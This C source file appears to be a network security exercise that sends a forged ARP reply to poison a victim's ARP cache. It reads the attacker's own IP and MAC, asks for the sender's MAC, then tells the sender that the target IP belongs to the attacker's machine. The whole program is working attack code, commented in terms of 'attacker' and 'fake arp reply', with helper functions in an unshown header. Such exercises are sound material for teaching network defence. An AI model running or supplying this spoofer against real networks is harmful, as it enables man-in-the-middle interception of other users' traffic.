#include "send_arp.h"

int main(int argc, const char* argv[]){

	const char* interface=argv[1];
	const char* sender_ip=argv[2];
	const char* target_ip=argv[3];
	struct pcap_pkthdr *header;		//packet header
	struct ifreq ifr;				//ifr
	struct sockaddr_in *attacker_ip;//attacker ip
	struct ether_header eth,fake_eth;//eth header
	struct ether_arp arp_req,fake_arp;
	unsigned char *attacker_mac;			//attacker mac
	unsigned char *sender_mac;			//sender mac
	unsigned char *target_mac;			//target mac
	unsigned char *packet_data;			//packet data

	//ifr
	memset(&ifr,0x00,sizeof(ifr));
	strcpy(ifr.ifr_name,interface);
	int s=socket(AF_INET,SOCK_DGRAM,0);
	if(s==-1){perror("socket");exit(1);}

	//attacker ip
	if(ioctl(s,SIOCGIFADDR,&ifr)==-1){perror("ioctl");exit(1);}
	attacker_ip=(struct sockaddr_in*)&ifr.ifr_addr;
	unsigned char attacker_ip_str[100];
	sprintf(attacker_ip_str,"%s",inet_ntoa(attacker_ip->sin_addr));
	printf("attacker ip : %s\n",attacker_ip_str);	
	//attacker mac
	if(ioctl(s,SIOCGIFHWADDR,&ifr)==-1){perror("ioctl");exit(1);}
	attacker_mac=(unsigned char*)ifr.ifr_hwaddr.sa_data;
	printf("attacker mac : ");
	print_mac(attacker_mac);

	//malloc return mac
	unsigned char* ret_mac;
	ret_mac = (unsigned char *)malloc(6*sizeof(unsigned char));
	
	//set arp request
	packet_data=set_eth_arp(&eth,&arp_req,NULL,attacker_mac,sender_ip,attacker_ip_str,1);
	//send arp_req packet with sender ip
	sender_mac=send_packet(packet_data,ret_mac,sender_ip,interface,header,1);
	printf("sender mac : ");
	print_mac(sender_mac);

	//&fake arp reply
	//set reply arp (opcode 2)
	packet_data=set_eth_arp(&fake_eth,&fake_arp,sender_mac,attacker_mac,sender_ip,target_ip,2);
	unsigned char* empty_mac;
	empty_mac=send_packet(packet_data,ret_mac,NULL,interface,header,0);
	
	//close socket
	close(s);
	//free ret_mac
	free(ret_mac);
	return 0;
}
